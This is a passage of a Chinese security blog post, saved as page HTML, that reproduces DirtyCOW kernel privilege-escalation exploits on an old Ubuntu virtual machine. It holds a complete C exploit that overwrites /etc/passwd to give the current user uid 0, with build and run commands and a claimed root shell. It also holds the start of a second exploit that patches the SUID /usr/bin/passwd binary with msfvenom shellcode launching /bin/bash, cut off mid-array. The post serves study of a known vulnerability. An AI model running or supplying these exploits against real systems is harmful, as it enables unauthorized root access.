@@ -1,0 +1,516 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="整理复现了几种基于dirtycow提权思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="230501-dirtycow-to-root">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/index.html">
+<meta property="og:site_name" content="blingbling&#39;s blog">
+<meta property="og:description" content="整理复现了几种基于dirtycow提权思路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/image-20230502015044932.png?size=600">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/image-20230502021331361.png?size=600">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/2023/0418-dirtycow/rwctf-Be-a-Docker-Escaper-3/Be-a-Docker-Escaper-3.assets/image-20230428190409281.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/image-20230428151541933.png?size=600">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/image-20230426180135721.png?size=600">
+<meta property="article:published_time" content="2023-05-01T19:06:49.000Z">
+<meta property="article:modified_time" content="2023-05-01T19:23:46.071Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/image-20230502015044932.png?size=600"><title>230501-dirtycow-to-root | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-to-root/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: undefined,
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">230501-dirtycow-to-root</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-05-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-05-02</span></span></div></header><div class="post-body">
+        <h1 id="基于dirtycow的几种提权思路"   >
+          <a href="#基于dirtycow的几种提权思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#基于dirtycow的几种提权思路" class="headerlink" title="基于dirtycow的几种提权思路"></a>基于dirtycow的几种提权思路</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" >官方</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>收集了多种基于dirtycow的利用exp并做了分类，提权需要考虑以下两个方面：</p>
+<ol>
+<li><p>如何产生COW</p>
+<ul>
+<li>写/proc/self/mem</li>
+<li>fork/clone后PTACE_POKEDATA</li>
+</ul>
+</li>
+<li><p>找哪个只读文件</p>
+<ul>
+<li>带suid的可执行程序，如/usr/bin/passwd</li>
+<li>特殊的只读文件，如/etc/passwd</li>
+<li>公用的一些库，如libc，vdso</li>
+</ul>
+</li>
+</ol>
+
+        <h1 id="利用-etc-passwd提权"   >
+          <a href="#利用-etc-passwd提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用-etc-passwd提权" class="headerlink" title="利用/etc/passwd提权"></a>利用/etc/passwd提权</h1>
+      
+        <h2 id="exp分析"   >
+          <a href="#exp分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2" >ngaro的exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 通过/proc/self/mem产生COW，修改/etc/passwd文件中当前用户的uid完成提权，代码逻辑分析如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line">    lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">  name=strdup(<span class="string">&quot;/etc/passwd&quot;</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  	打开/etc/passwd文件，复制其内容到towrite指向的堆块</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  f=open(name,O_RDONLY);			</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  <span class="keyword">char</span>* towrite=<span class="built_in">malloc</span>(st.st_size+<span class="number">1</span>);</span><br><span class="line">  read(f, towrite, st.st_size);</span><br><span class="line">  towrite[st.st_size]=<span class="number">0</span>;</span><br><span class="line">  close(f);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  	在towrite堆块中，将当前用户的uid位置改成0。由于改完之后passwd文件长度比源文件短，所以需要将后几个字节用&#x27;\n&#x27;覆盖</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">char</span> *attackline; <span class="keyword">char</span> *exploitedline;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">attacker</span>=</span>getpwuid(getuid());		<span class="comment">// 根据传入的用户ID返回指向passwd的结构体</span></span><br><span class="line">  asprintf(&amp;attackline,<span class="string">&quot;%s:%s:%d:%d:%s:%s:%s&quot;</span>,attacker-&gt;pw_name,attacker-&gt;pw_passwd,attacker-&gt;pw_uid, attacker-&gt;pw_gid,attacker-&gt;pw_gecos,attacker-&gt;pw_dir,attacker-&gt;pw_shell);</span><br><span class="line">  asprintf(&amp;exploitedline,<span class="string">&quot;%s:%s:0:%d:%s:%s:%s&quot;</span>,attacker-&gt;pw_name,attacker-&gt;pw_passwd, attacker-&gt;pw_gid,attacker-&gt;pw_gecos,attacker-&gt;pw_dir,attacker-&gt;pw_shell);</span><br><span class="line">  <span class="keyword">char</span> *endoffile=<span class="built_in">strstr</span>(towrite,attackline)+<span class="built_in">strlen</span>(attackline);</span><br><span class="line">  <span class="keyword">char</span> *changelocation=<span class="built_in">strstr</span>(towrite,attackline); </span><br><span class="line">  <span class="keyword">int</span> oldfilelen=<span class="built_in">strlen</span>(towrite);</span><br><span class="line">  <span class="built_in">sprintf</span>(changelocation,<span class="string">&quot;%s%s&quot;</span>,exploitedline,endoffile);</span><br><span class="line">  <span class="keyword">int</span> linediff=<span class="built_in">strlen</span>(attackline)-<span class="built_in">strlen</span>(exploitedline);</span><br><span class="line">  <span class="keyword">int</span> i; <span class="keyword">for</span>(i=oldfilelen; i&gt;oldfilelen-linediff; i--) towrite[i<span class="number">-1</span>]=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  f=open(name,O_RDONLY);			<span class="comment">// 只读模式打开/etc/passwd</span></span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line">    </span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,name);   </span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,towrite);			<span class="comment">// 用towrite堆块内容覆盖原/etc/passwd，使当前用户uid变为0，达到提权目的</span></span><br><span class="line"></span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="exp验证"   >
+          <a href="#exp验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp验证" class="headerlink" title="exp验证"></a>exp验证</h2>
+      <p>环境准备：下载老版本 <span class="exturl"><a class="exturl__link"   href="https://link.juejin.cn/?target=http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso" >ubuntu-server 14.04.5</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 镜像并安装到虚拟机</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc dirty.c -lpthread -o dirty</span><br><span class="line">.&#x2F;dirty</span><br></pre></td></tr></table></div></figure>
+<p>执行完成后，重启linux。以普通用户登录，可以拿到root shell。</p>
+<p><img   src="image-20230502015044932.png?size=600" style="width: 600px;"  alt="image-20230502015044932"></p>
+
+        <h1 id="利用-usr-bin-passwd提权"   >
+          <a href="#利用-usr-bin-passwd提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用-usr-bin-passwd提权" class="headerlink" title="利用/usr/bin/passwd提权"></a>利用/usr/bin/passwd提权</h1>
+      
+        <h2 id="exp分析-1"   >
+          <a href="#exp分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp分析-1" class="headerlink" title="exp分析"></a>exp分析</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679" >rverton的exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 通过/proc/self/mem产生COW，修改带SUID位的二进制程序/usr/bin/passwd完成提权，代码逻辑分析如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">int</span> stop = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">pthread_t</span> pth1,pth2,pth3;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用前需确认该SUID程序是可读的</span></span><br><span class="line"><span class="keyword">char</span> suid_binary[] = <span class="string">&quot;/usr/bin/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 通过msfvenom生成的64位架构shellcode</span></span><br><span class="line"><span class="comment">* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sc[] = &#123;</span><br><span class="line">  <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xb1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xea</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>,</span><br><span class="line">  <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sc_len = <span class="number">177</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 通过msfvenom生成的32位架构shellcode</span></span><br><span class="line"><span class="comment">* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i</span></span><br><span class="line"><span class="comment">unsigned char sc[] = &#123;</span></span><br><span class="line"><span class="comment">  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,</span></span><br><span class="line"><span class="comment">  0x00, 0x00, 